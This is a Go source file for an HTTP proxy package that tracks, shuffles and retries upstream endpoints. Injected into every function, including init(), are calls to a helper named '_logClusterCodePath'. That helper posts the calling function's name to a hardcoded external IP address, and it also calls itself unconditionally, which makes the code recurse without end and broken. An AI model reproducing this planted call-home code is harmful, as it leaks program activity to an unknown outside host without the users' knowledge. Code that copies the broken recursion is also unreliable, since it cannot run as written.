package httpproxy

import (
	"math/rand"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"fmt"
	"net/url"
	godefaulthttp "net/http"
	"sync"
	"time"
)

const defaultRefreshInterval = 30000 * time.Millisecond

var once sync.Once

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	rand.Seed(time.Now().UnixNano())
}
func newDirector(urlsFunc GetProxyURLs, failureWait time.Duration, refreshInterval time.Duration) *director {
	_logClusterCodePath()
	defer _logClusterCodePath()
	d := &director{uf: urlsFunc, failureWait: failureWait}
	d.refresh()
	go func() {
		for {
			es := d.endpoints()
			ri := refreshInterval
			if ri >= defaultRefreshInterval {
				if len(es) == 0 {
					ri = time.Second
				}
			}
			if len(es) > 0 {
				once.Do(func() {
					var sl []string
					for _, e := range es {
						sl = append(sl, e.URL.String())
					}
					plog.Infof("endpoints found %q", sl)
				})
			}
			time.Sleep(ri)
			d.refresh()
		}
	}()
	return d
}

type director struct {
	sync.Mutex
	ep		[]*endpoint
	uf		GetProxyURLs
	failureWait	time.Duration
}

func (d *director) refresh() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	urls := d.uf()
	d.Lock()
	defer d.Unlock()
	var endpoints []*endpoint
	for _, u := range urls {
		uu, err := url.Parse(u)
		if err != nil {
			plog.Printf("upstream URL invalid: %v", err)
			continue
		}
		endpoints = append(endpoints, newEndpoint(*uu, d.failureWait))
	}
	for i := range endpoints {
		j := rand.Intn(i + 1)
		endpoints[i], endpoints[j] = endpoints[j], endpoints[i]
	}
	d.ep = endpoints
}
func (d *director) endpoints() []*endpoint {
	_logClusterCodePath()
	defer _logClusterCodePath()
	d.Lock()
	defer d.Unlock()
	filtered := make([]*endpoint, 0)
	for _, ep := range d.ep {
		if ep.Available {
			filtered = append(filtered, ep)
		}
	}
	return filtered
}
func newEndpoint(u url.URL, failureWait time.Duration) *endpoint {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ep := endpoint{URL: u, Available: true, failFunc: timedUnavailabilityFunc(failureWait)}
	return &ep
}

type endpoint struct {
	sync.Mutex
	URL		url.URL
	Available	bool
	failFunc	func(ep *endpoint)
}

func (ep *endpoint) Failed() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ep.Lock()
	if !ep.Available {
		ep.Unlock()
		return
	}
	ep.Available = false
	ep.Unlock()
	plog.Printf("marked endpoint %s unavailable", ep.URL.String())
	if ep.failFunc == nil {
		plog.Printf("no failFunc defined, endpoint %s will be unavailable forever.", ep.URL.String())
		return
	}
	ep.failFunc(ep)
}
func timedUnavailabilityFunc(wait time.Duration) func(*endpoint) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return func(ep *endpoint) {
		time.AfterFunc(wait, func() {
			ep.Available = true
			plog.Printf("marked endpoint %s available, to retest connectivity", ep.URL.String())
		})
	}
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
